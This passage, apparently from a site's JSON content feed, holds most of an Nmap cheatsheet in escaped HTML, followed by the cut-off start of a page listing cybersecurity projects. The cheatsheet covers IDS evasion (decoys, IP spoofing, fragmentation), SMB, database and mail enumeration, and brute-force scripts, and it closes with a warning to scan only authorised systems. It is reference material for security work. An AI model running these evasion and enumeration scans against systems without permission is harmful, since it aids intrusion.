class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --mtu \u003cspan class=\"m\"\u003e24\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Decoy scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -D RND:10 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -D decoy1,decoy2,ME,decoy3 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Source IP spoofing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -S spoofed_ip target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Source port specification\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --source-port \u003cspan class=\"m\"\u003e53\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -g \u003cspan class=\"m\"\u003e53\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-evasion\"\u003eAdvanced Evasion\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Random delay between probes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --scan-delay 5s target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Random host order\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --randomize-hosts target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Bad checksum (firewall testing)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --badsum target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Data length\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --data-length \u003cspan class=\"m\"\u003e25\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003ch3 id=\"standard-output\"\u003eStandard Output\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Normal output\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Verbose output\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -v target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -vv target  \u003cspan class=\"c1\"\u003e# More verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Debug output\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -d target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -dd target  \u003cspan class=\"c1\"\u003e# More debug info\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"file-output\"\u003eFile Output\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Normal format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oN scan_results.txt target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# XML format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oX scan_results.xml target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Grepable format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oG scan_results.gnmap target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# All formats\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oA scan_results target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Script kiddie format\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oS scan_results.txt target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"advanced-techniques\"\u003eAdvanced Techniques\u003c/h2\u003e\n\u003ch3 id=\"performance-optimization\"\u003ePerformance Optimization\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Parallel host scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --min-hostgroup \u003cspan class=\"m\"\u003e50\u003c/span\u003e --max-hostgroup \u003cspan class=\"m\"\u003e100\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Parallel port scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --min-parallelism \u003cspan class=\"m\"\u003e50\u003c/span\u003e --max-parallelism \u003cspan class=\"m\"\u003e100\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Packet rate control\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --min-rate \u003cspan class=\"m\"\u003e1000\u003c/span\u003e --max-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Timeout control\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --host-timeout 300s target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"network-interface-control\"\u003eNetwork Interface Control\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify interface\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -e eth0 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Specify source IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -S 192.168.1.50 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# IPv6 scanning\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -6 target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"firewallids-testing\"\u003eFirewall/IDS Testing\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ACK scan for firewall rules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sA -p 1-1000 target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Window scan for firewall detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sW target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIN scan to bypass simple firewalls\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sF target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"practical-examples\"\u003ePractical Examples\u003c/h2\u003e\n\u003ch3 id=\"web-server-enumeration\"\u003eWeb Server Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Comprehensive web server scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 80,443 -sV --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp-enum,http-headers,http-methods,ssl-cert target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# WordPress enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 80,443 --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp-wordpress-enum target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"smb-enumeration\"\u003eSMB Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Complete SMB enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p \u003cspan class=\"m\"\u003e445\u003c/span\u003e --script\u003cspan class=\"o\"\u003e=\u003c/span\u003esmb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SMB vulnerability scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p \u003cspan class=\"m\"\u003e445\u003c/span\u003e --script\u003cspan class=\"o\"\u003e=\u003c/span\u003esmb-vuln-* target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"database-enumeration\"\u003eDatabase Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# MySQL enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p \u003cspan class=\"m\"\u003e3306\u003c/span\u003e --script\u003cspan class=\"o\"\u003e=\u003c/span\u003emysql-enum,mysql-info,mysql-databases,mysql-variables target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# MSSQL enumeration  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p \u003cspan class=\"m\"\u003e1433\u003c/span\u003e --script\u003cspan class=\"o\"\u003e=\u003c/span\u003ems-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Oracle enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p \u003cspan class=\"m\"\u003e1521\u003c/span\u003e --script\u003cspan class=\"o\"\u003e=\u003c/span\u003eoracle-sid-brute,oracle-enum-users target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"mail-server-enumeration\"\u003eMail Server Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SMTP enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 25,465,587 --script\u003cspan class=\"o\"\u003e=\u003c/span\u003esmtp-enum-users,smtp-commands,smtp-open-relay target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# POP3/IMAP enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -p 110,143,993,995 --script\u003cspan class=\"o\"\u003e=\u003c/span\u003epop3-capabilities,imap-capabilities target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"nse-script-development\"\u003eNSE Script Development\u003c/h2\u003e\n\u003ch3 id=\"basic-script-structure\"\u003eBasic Script Structure\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e-- nmap script example\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003elocal\u003c/span\u003e \u003cspan class=\"n\"\u003enmap\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequire\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;nmap\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003elocal\u003c/span\u003e \u003cspan class=\"n\"\u003eshortport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequire\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e[[\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eScript description here\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eauthor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Your Name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003elicense\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Same as Nmap--See https://nmap.org/book/man-legal.html\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecategories\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;default\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;discovery\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eportrule\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eshortport.port_or_service\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaction\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kr\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kr\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Script output\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kr\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"common-nmap-commands-quick-reference\"\u003eCommon Nmap Commands Quick Reference\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eCommand\u003c/th\u003e\n          \u003cth\u003eDescription\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -sS target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eTCP SYN scan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -sU target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eUDP scan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -sV target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eVersion detection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -O target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eOS detection\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -A target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eAggressive scan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -sC target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eDefault scripts\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -p- target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eAll ports\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -T4 target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eAggressive timing\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -Pn target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSkip ping\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003enmap -oA results target\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eAll output formats\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"tips--best-practices\"\u003eTips \u0026amp; Best Practices\u003c/h2\u003e\n\u003ch3 id=\"performance-tips\"\u003ePerformance Tips\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003e-T4\u003c/code\u003e for faster scans on reliable networks\u003c/li\u003e\n\u003cli\u003eCombine \u003ccode\u003e-sS -sU\u003c/code\u003e for comprehensive coverage\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e--top-ports\u003c/code\u003e for quick reconnaissance\u003c/li\u003e\n\u003cli\u003eLeverage \u003ccode\u003e--min-rate\u003c/code\u003e and \u003ccode\u003e--max-rate\u003c/code\u003e for speed control\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"stealth-considerations\"\u003eStealth Considerations\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003e-T0\u003c/code\u003e or \u003ccode\u003e-T1\u003c/code\u003e for stealth scanning\u003c/li\u003e\n\u003cli\u003eImplement decoy scanning with \u003ccode\u003e-D\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFragment packets with \u003ccode\u003e-f\u003c/code\u003e to evade detection\u003c/li\u003e\n\u003cli\u003eUse source port manipulation with \u003ccode\u003e-g\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"legal--ethical-notes\"\u003eLegal \u0026amp; Ethical Notes\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e‚ö†Ô∏è \u003cstrong\u003eWarning\u003c/strong\u003e: Only scan systems you own or have explicit permission to test. Unauthorized scanning may be illegal in your jurisdiction.\u003c/p\u003e","title":"Nmap Cheatsheet - Complete Port Scanning Reference"},{"content":"Cybersecurity Projects \u0026amp; Tools Explore my collection of security tools, research projects, and contributions to the cybersecurity community.\nProjects\rTools\rGitHub\rüîç\rActive Development\rNetwork Reconnaissance Suite\rComprehensive toolkit for automated network discovery and enumeration with stealth capabilities.\nPython\rBash\rNetworking\rMulti-threaded port scanning\rService detection and version identification\rVulnerability assessment integration\rCustom payload generation\rGitHub\rDocumentation\rüõ°Ô∏è\rProduction Ready\rPenetration Testing Framework\rModular framework for systematic penetration testing with automated exploitation 